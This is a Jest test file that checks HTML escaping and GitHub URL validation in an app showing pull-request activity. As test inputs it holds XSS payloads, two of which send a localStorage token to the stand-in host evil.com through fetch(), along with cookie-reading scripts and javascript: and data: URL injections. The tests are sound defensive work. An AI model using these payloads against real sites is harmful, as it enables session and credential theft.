/**
 * Security tests for XSS prevention and URL validation
 */

import { describe, it, expect } from '@jest/globals';
import { escapeHtml, sanitizeImageUrl, sanitizeActivity, sanitizeRepository } from '../shared/sanitize.js';
import { isValidGitHubUrl, isValidApiUrl } from '../shared/security.js';

describe('HTML Sanitization', () => {
  describe('escapeHtml', () => {
    it('should escape HTML special characters', () => {
      expect(escapeHtml('<script>alert("xss")</script>')).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
      expect(escapeHtml('Test & <test>')).toBe('Test &amp; &lt;test&gt;');
      expect(escapeHtml("It's a 'test'")).toBe('It&#039;s a &#039;test&#039;');
    });

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('should handle non-string inputs', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml(123)).toBe('');
    });

    it('should prevent XSS in PR titles', () => {
      const maliciousTitles = [
        '<img src=x onerror=alert(1)>',
        '<script>fetch("evil.com?token="+localStorage.token)</script>',
        '"><script>alert(document.cookie)</script>'
      ];

      maliciousTitles.forEach(title => {
        const sanitized = escapeHtml(title);
        // Tags should be escaped
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).toContain('&lt;');
        // Verify the dangerous parts are now harmless (escaped)
        if (title.includes('onerror')) {
          expect(sanitized).toContain('&lt;img');
        }
      });
    });

    it('should not modify safe text', () => {
      const safeText = 'Fix authentication bug in user login';
      expect(escapeHtml(safeText)).toBe(safeText);
    });
  });

  describe('sanitizeImageUrl', () => {
    it('should allow valid GitHub avatar URLs', () => {
      const validUrls = [
        'https://avatars.githubusercontent.com/u/123456',
        'https://github.com/avatar.png',
        'https://raw.githubusercontent.com/user/repo/main/image.png'
      ];

      validUrls.forEach(url => {
        expect(sanitizeImageUrl(url)).toBe(url);
      });
    });

    it('should reject non-HTTPS URLs', () => {
      expect(sanitizeImageUrl('http://avatars.githubusercontent.com/u/123456')).toBe('');
      expect(sanitizeImageUrl('ftp://github.com/avatar.png')).toBe('');
    });

    it('should reject URLs from non-GitHub domains', () => {
      expect(sanitizeImageUrl('https://evil.com/malicious.png')).toBe('');
      expect(sanitizeImageUrl('https://github.evil.com/avatar.png')).toBe('');
    });

    it('should reject javascript: URLs', () => {
      expect(sanitizeImageUrl('javascript:alert(1)')).toBe('');
    });

    it('should handle invalid URLs', () => {
      expect(sanitizeImageUrl('not a url')).toBe('');
      expect(sanitizeImageUrl(null)).toBe('');
      expect(sanitizeImageUrl(undefined)).toBe('');
    });
  });

  describe('sanitizeActivity', () => {
    it('should sanitize all activity fields', () => {
      const activity = {
        id: '123',
        title: '<script>alert(1)</script>Fix bug',
        author: 'evil<script>user',
        repo: 'owner/repo<img src=x>',
        authorAvatar: 'https://avatars.githubusercontent.com/u/123',
        url: 'https://github.com/owner/repo/pull/1'
      };

      const sanitized = sanitizeActivity(activity);

      expect(sanitized.title).not.toContain('<script>');
      expect(sanitized.author).not.toContain('<script>');
      expect(sanitized.repo).not.toContain('<img');
      expect(sanitized.title).toContain('&lt;script&gt;');
    });
  });

  describe('sanitizeRepository', () => {
    it('should sanitize repository fields', () => {
      const repo = {
        fullName: 'owner/repo<script>',
        description: 'A test <img src=x onerror=alert(1)>',
        language: 'JavaScript<script>alert(1)</script>'
      };

      const sanitized = sanitizeRepository(repo);

      // Verify HTML tags are escaped
      expect(sanitized.fullName).not.toContain('<script>');
      expect(sanitized.fullName).toContain('&lt;script&gt;');
      expect(sanitized.description).not.toContain('<img');
      expect(sanitized.description).toContain('&lt;img');
      expect(sanitized.language).not.toContain('<script>');
    });
  });
});

describe('URL Validation', () => {
  describe('isValidGitHubUrl', () => {
    it('should accept valid GitHub URLs', () => {
      const validUrls = [
        'https://github.com/owner/repo',
        'https://github.com/owner/repo/pull/123',
        'https://github.com/owner/repo/issues/456',
        'https://gist.github.com/user/abc123'
      ];

      validUrls.forEach(url => {
        expect(isValidGitHubUrl(url)).toBe(true);
      });
    });

    it('should reject non-HTTPS URLs', () => {
      expect(isValidGitHubUrl('http://github.com/owner/repo')).toBe(false);
    });

    it('should reject javascript: URLs', () => {
      expect(isValidGitHubUrl('javascript:alert(1)')).toBe(false);
    });

    it('should reject data: URLs', () => {
      expect(isValidGitHubUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('should reject non-GitHub domains', () => {
      expect(isValidGitHubUrl('https://evil.com')).toBe(false);
      expect(isValidGitHubUrl('https://github.evil.com')).toBe(false);
    });

    it('should handle invalid URLs', () => {
      expect(isValidGitHubUrl('not a url')).toBe(false);
      expect(isValidGitHubUrl(null)).toBe(false);
      expect(isValidGitHubUrl(undefined)).toBe(false);
    });
  });

  describe('isValidApiUrl', () => {
    it('should accept valid API URLs', () => {
      expect(isValidApiUrl('https://api.github.com/repos/owner/repo')).toBe(true);
      expect(isValidApiUrl('https://registry.npmjs.org/package')).toBe(true);
    });

    it('should reject non-HTTPS URLs', () => {
      expect(isValidApiUrl('http://api.github.com/repos')).toBe(false);
    });

    it('should reject non-API domains', () => {
      expect(isValidApiUrl('https://evil.com/api')).toBe(false);
    });

    it('should support custom allowed domains', () => {
      expect(isValidApiUrl('https://custom.api.com/endpoint', ['custom.api.com'])).toBe(true);
      expect(isValidApiUrl('https://evil.com/endpoint', ['custom.api.com'])).toBe(false);
    });
  });
});

describe('XSS Attack Scenarios', () => {
  it('should prevent XSS through PR titles', () => {
    const maliciousPR = {
      title: 'Fix bug <img src=x onerror="fetch(\'https://evil.com?token=\'+localStorage.token)">',
      author: 'attacker',
      repo: 'victim/repo',
      authorAvatar: 'https://avatars.githubusercontent.com/u/123',
      url: 'https://github.com/victim/repo/pull/1'
    };

    const sanitized = sanitizeActivity(maliciousPR);
    // Verify the malicious tag is escaped and harmless
    expect(sanitized.title).toContain('&lt;img');
    expect(sanitized.title).not.toContain('<img');
    expect(sanitized.title).toContain('Fix bug');
  });

  it('should prevent XSS through usernames', () => {
    const activity = {
      title: 'Normal title',
      author: '<script>alert(document.cookie)</script>',
      repo: 'owner/repo',
      authorAvatar: 'https://avatars.githubusercontent.com/u/123',
      url: 'https://github.com/owner/repo/pull/1'
    };

    const sanitized = sanitizeActivity(activity);
    expect(sanitized.author).toContain('&lt;script&gt;');
    expect(sanitized.author).not.toContain('<script>');
  });

  it('should prevent javascript: URL injection', () => {
    expect(isValidGitHubUrl('javascript:alert(document.cookie)')).toBe(false);
    expect(isValidGitHubUrl('javascript:void(0)')).toBe(false);
    expect(isValidGitHubUrl('JAVASCRIPT:alert(1)')).toBe(false);
  });

  it('should prevent data: URL injection', () => {
    expect(isValidGitHubUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isValidGitHubUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
  });
});
